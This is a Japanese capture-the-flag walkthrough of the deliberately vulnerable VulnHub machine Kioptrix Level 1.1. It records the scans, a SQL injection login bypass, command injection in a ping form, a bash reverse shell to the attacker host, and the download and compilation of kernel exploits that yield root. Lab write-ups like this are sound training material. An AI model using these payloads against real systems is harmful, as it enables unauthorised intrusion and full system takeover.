# Kioptrix: Level 1.1

VulnHubの初心者向けマシン **Kioptrix: Level 1.1**（Level 2）の攻略メモです。

詳細な解説はNoteにまとめ、ここでは使用したコマンドと攻撃経路を中心に記録しています。

## Environment

```text
Attacker   : Kali Linux (192.168.56.3)
Target     : Kioptrix: Level 1.1 (Level 2)
Target IP  : 192.168.56.5
Difficulty : Easy - Medium
```

## Recon

```bash
ip addr
netdiscover -r 192.168.56.0/24
```

Target:

```text
192.168.56.5
```

## Enumeration

```bash
sudo nmap -Pn -sS -sV 192.168.56.5
```

Output:

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
```

主な調査対象：

```text
Web (Port 80/443)
```

### Web

```bash
gobuster dir -u http://192.168.56.5 -w /usr/share/wordlists/dirb/common.txt
nikto -h 192.168.56.5
```

確認した情報：

```text
Apache/2.0.52 (CentOS)
PHP/4.3.9
index.php (Login Page)
```

## Vulnerability Analysis

Web画面（`http://192.168.56.5`）の挙動を確認。

### SQL Injection

ログインフォームにて以下を入力：

```text
Username : ' or 1=1--
Password : ' or 1=1--
```

Result:

```text
ログイン認証を回避し、管理画面（Pingコンソール）へアクセス成功
```

### OS Command Injection

ログイン後のPing機能にて以下を入力：

```text
;whoami;uname -a
```

Result:

```text
apache
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686
```

## Exploitation

### Reverse Shell

Kali:

```bash
nc -lvp 8080
```

Target (Web Form):

```text
192.168.56.3 | bash -i >& /dev/tcp/192.168.56.3/8080 0>&1
```

Result:

```text
apache 権限でリバースシェル獲得
```

### Internal Enumeration & Source Code

Target:

```bash
ls
cat index.php
cat pingit.php
lsb_release -a
cat /proc/version
```

確認した内部情報：

```text
OS            : CentOS release 4.5 (Final)
Kernel        : Linux version 2.6.9-55.EL
MySQL Auth    : john / hiroshima
```

`index.php` および `pingit.php` のソースコードを確認し、入力値のエスケープ処理が行われていないことを特定。

## Privilege Escalation

Kali:

```bash
searchsploit CentOS 4.5
searchsploit linux 2.6 centos

cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c 9542.c
searchsploit -m linux/local/9545.c

python3 -m http.server 4444
```

Target:

```bash
cd /tmp
wget http://192.168.56.3:4444/9542.c
wget http://192.168.56.3:4444/9545.c

gcc -o 9542 9542.c
gcc -o 9545 9545.c

./9542
./9545
```

Result:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=48(apache)
```

## Attack Paths

```text
Web Login (SQL Injection)
    ↓
Ping Form (OS Command Injection)
    ↓
Reverse Shell (apache)
    ↓
Kernel Exploit (CentOS 4.5 / Linux 2.6.9)
    ↓
root
```

## Notes

Level 1と異なり、Webアプリケーション層の脆弱性（SQLiおよびCommand Injection）を起点とした侵入手順となりました。

詳細な手順や各コマンドの説明についてはNoteにまとめています。

> This write-up was created for educational purposes in an authorized local VulnHub environment.
